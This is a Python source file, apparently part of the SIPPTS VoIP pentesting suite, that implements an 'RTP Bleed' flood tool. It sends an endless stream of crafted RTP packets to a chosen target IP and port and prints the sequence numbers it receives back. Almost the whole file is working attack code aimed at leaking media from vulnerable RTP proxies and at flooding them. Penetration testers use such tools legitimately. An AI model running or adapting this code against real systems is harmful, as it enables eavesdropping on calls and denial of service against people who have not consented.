#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = 'Jose Luis Verdeguer'
__version__ = '3.2'
__license__ = "GPL"
__copyright__ = "Copyright (C) 2015-2022, SIPPTS"
__email__ = "pepeluxx@gmail.com"

# based in rtpnatscan: https://github.com/kapejod/rtpnatscan

import socket
import fcntl
import os
import sys

BRED = '\033[1;31;40m'
RED = '\033[0;31;40m'
BRED_BLACK = '\033[1;30;41m'
RED_BLACK = '\033[0;30;41m'
BGREEN = '\033[1;32;40m'
GREEN = '\033[0;32;40m'
BGREEN_BLACK = '\033[1;30;42m'
GREEN_BLACK = '\033[0;30;42m'
BYELLOW = '\033[1;33;40m'
YELLOW = '\033[0;33;40m'
BBLUE = '\033[1;34;40m'
BLUE = '\033[0;34;40m'
BMAGENTA = '\033[1;35;40m'
MAGENTA = '\033[0;35;40m'
BCYAN = '\033[1;36;40m'
CYAN = '\033[0;36;40m'
BWHITE = '\033[1;37;40m'
WHITE = '\033[0;37;40m'


class RTPBleedFlood:
    def __init__(self):
        self.ip = ''
        self.port = ''
        self.payload = '0'

    def start(self):
        self.port = int(self.port)
        self.payload = int(self.payload)

        print(BWHITE + '[!] Target IP: ' + YELLOW + '%s' % self.ip)
        print(BWHITE + '[!] Target port:' + YELLOW + ' %d' % self.port)
        print(BWHITE + '[!] Payload type: ' + YELLOW + '%d' % self.payload)
        print(WHITE)

        print(YELLOW + '[+] Sending RTP packets to %s:%d' %
              (self.ip, self.port) + WHITE)

        # Create a UDP socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except socket.error:
            print(RED + 'Failed to create socket' + WHITE)
            sys.exit(1)
        fcntl.fcntl(sock, fcntl.F_SETFL, os.O_NONBLOCK)

        host = (str(self.ip), self.port)
        nloop = 0

        while True:
            try:
                nloop += 1
                cloop = hex(nloop)[2:]
                cloop = cloop.zfill(4)
                cpayload = '%s' % hex(0x80 | self.payload & 0x7F)[2:]
                # byte[0] = 0x80 => RTP version 2
                # byte[1] = 0x80+payload => Codec version (https://en.wikipedia.org/wiki/RTP_payload_formats)
                # byte[2-3] = Sequence number
                message = ('80'+cpayload+cloop+'0000000000000000')
                byte_array = bytearray.fromhex(message)

                if nloop == 65535:
                    nloop = 1

                # Send data
                sock.sendto(byte_array, host)

                try:
                    (msg, addr) = sock.recvfrom(4096)
                    (ipaddr, rport) = addr
                    size = len(msg)

                    if size >= 12:
                        x = '%s%s' % (hex(msg[2])[2:], hex(msg[3])[2:])
                        seq = int('0x%s' % x, base=16)
                        x = '%s%s%s%s' % (hex(msg[4])[2:], hex(msg[5])[
                                          2:], hex(msg[6])[2:], hex(msg[7])[2:])
                        timestamp = int('0x%s' % x, base=16)
                        ssrc = '%s%s%s%s' % (hex(msg[8])[2:], hex(
                            msg[9])[2:], hex(msg[10])[2:], hex(msg[11])[2:])

                        print(WHITE + 'received %d bytes from target port %d Seq number %s' %
                              (size, rport, seq))
                except:
                    # No data available
                    continue
            except KeyboardInterrupt:
                print(YELLOW + 'You pressed Ctrl+C!')
                exit()
            except:
                pass
